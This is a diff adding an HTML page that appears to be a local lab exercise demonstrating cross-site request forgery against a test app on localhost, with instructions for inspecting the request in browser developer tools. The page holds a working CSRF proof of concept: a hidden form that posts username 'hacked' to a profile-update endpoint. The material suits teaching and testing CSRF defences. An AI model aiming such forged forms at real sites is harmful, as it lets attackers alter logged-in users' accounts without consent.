@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        .instructions {
+            background: #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .steps {
+            margin-left: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h2>CSRF Attack Test Page</h2>
+    
+    <div class="instructions">
+        <h3>How to check the CSRF token:</h3>
+        <ol class="steps">
+            <li>First, <a href="http://localhost/csrf/login.php" target="_blank">login here</a> (open in new tab)</li>
+            <li>After logging in, come back to this page</li>
+            <li>Press F12 to open Developer Tools</li>
+            <li>Go to the Network tab</li>
+            <li>Click the "Try CSRF Attack" button below</li>
+            <li>In the Network tab, look for the request to "process_profile_update.php"</li>
+            <li>Click on the request to see its details</li>
+            <li>Look under the "Form Data" or "Request Payload" section</li>
+        </ol>
+    </div>
+
+    <!-- Regular form submission -->
+    <form action="http://localhost/csrf/process_profile_update.php" method="post">
+        <input type="hidden" name="username" value="hacked">
+        <input type="submit" value="Try CSRF Attack">
+    </form>
+
+    <p style="margin-top: 20px; color: #666;">
+        Note: You won't see the CSRF token in this request because this is the attack page. 
+        To see the actual CSRF token, go to the real update profile page after logging in.
+    </p>
+</body>
+</html> 
